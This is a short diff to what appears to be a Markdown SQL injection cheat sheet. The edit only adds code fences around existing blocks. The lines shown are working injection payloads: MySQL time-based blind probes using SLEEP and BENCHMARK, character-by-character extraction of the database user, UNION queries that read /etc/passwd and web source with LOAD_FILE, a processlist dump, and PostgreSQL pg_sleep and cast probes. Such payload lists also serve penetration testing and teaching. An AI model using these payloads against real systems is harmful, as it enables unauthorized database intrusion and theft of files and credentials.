@@ -74,7 +74,7 @@ AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
 ```
 
 ## MYSQL Time Based
-
+```sql
 AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
 OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
 AND SLEEP(10)=0
@@ -93,8 +93,8 @@ AND SLEEP(10)=0
 ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
 ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
 ?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
-
-
+```
+```sql
 UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
 UNION ALL SELECT LOAD_FILE('/etc/passwd') --
 UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
@@ -116,7 +116,7 @@ username=ittt"+union+select+username,flag,"9990775155c3518a0d7917f7780b24aa"+fro
 ' AND 1=CAST((SELECT 1) AS int)--
 ' || (SELECT case when (1=1) then pg_sleep(5) else pg_sleep(-1) end)--
 ' union select 0x27206F726465722062792033202D2D202D -- -
-
+```
 
 
 
